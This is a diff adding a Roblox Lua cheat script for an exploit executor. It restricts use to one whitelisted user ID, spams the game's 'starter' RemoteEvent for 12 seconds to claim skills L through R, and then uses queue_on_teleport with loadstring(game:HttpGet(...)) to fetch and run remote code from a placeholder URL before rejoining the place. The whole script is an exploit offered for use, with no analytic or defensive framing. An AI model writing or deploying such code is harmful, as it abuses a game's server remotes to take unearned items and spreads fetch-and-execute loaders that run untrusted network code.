@@ -1,0 +1,58 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+
+local LocalPlayer = Players.LocalPlayer
+local WHITELISTED_ID = 5703916605
+
+if LocalPlayer.UserId ~= WHITELISTED_ID then
+    LocalPlayer:Kick("nice try buddy, i dont trust yall yet")
+    return
+end
+
+if LocalPlayer.UserId == 0 or LocalPlayer.UserId ~= WHITELISTED_ID then
+    LocalPlayer:Kick("do you think i'm stupid lmao")
+    return
+end
+
+local starter = ReplicatedStorage:WaitForChild("starter")
+
+local SkillsOrder = {"SkillL", "SkillM", "SkillN", "SkillO", "SkillP", "SkillQ", "SkillR"}
+
+local function GetNextSkill()
+    local stats = LocalPlayer:FindFirstChild("Stats")
+    if not stats then return "SkillL" end
+    
+    for _, skillName in ipairs(SkillsOrder) do
+        if not stats:FindFirstChild(skillName) then
+            return skillName
+        end
+    end
+    return nil
+end
+
+local nextSkill = GetNextSkill()
+
+if not nextSkill then
+    print("All skills from L to R already claimed!")
+    return
+end
+
+print("Claiming: " .. nextSkill)
+
+-- Claim the skill
+local claimed = false
+local startTime = tick()
+
+while tick() - startTime < 12 do
+    starter:FireServer(nextSkill)
+    task.wait(0.0001)
+end
+
+print("Finished claiming " .. nextSkill)
+
+task.wait(1.5)
+queue_on_teleport([[ 
+    loadstring(game:HttpGet("https://yourscriptlink.com/script.lua"))() 
+]])
+TeleportService:Teleport(game.PlaceId, LocalPlayer)
